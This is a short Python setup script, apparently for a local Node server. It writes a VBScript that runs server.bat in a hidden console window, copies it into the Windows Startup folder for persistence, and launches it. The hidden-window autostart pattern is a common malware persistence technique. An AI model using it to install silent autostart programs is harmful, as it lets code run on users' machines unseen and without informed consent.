# node_server 1.0

import os
import time
import shutil

def realPath(filname):
    return f"{os.getcwd()}\\{filname}"

def command(command):
    os.system(command)

def addStartUp(filePath):
    if os.name == 'nt':
        path = f"{os.environ['appdata']}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        shutil.copy(filePath, path)
        print("Startup installed.")

vbs = f"""
Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "cmd.exe /C ""{realPath("")}\server.bat"" "
oShell.Run strArgs, 0, false

"""

with open(realPath("server.vbs"), 'w') as vbsFile:
    vbsFile.write(vbs)

time.sleep(2)
addStartUp(realPath("server.vbs"))

time.sleep(2)
print("installing package.json")
# command("npm install package.json")

time.sleep(1)
# command("npm audit fix --force")

time.sleep(2)
os.startfile(realPath("server.vbs"))
os.startfile(realPath("readme.html"))
print("DONE.")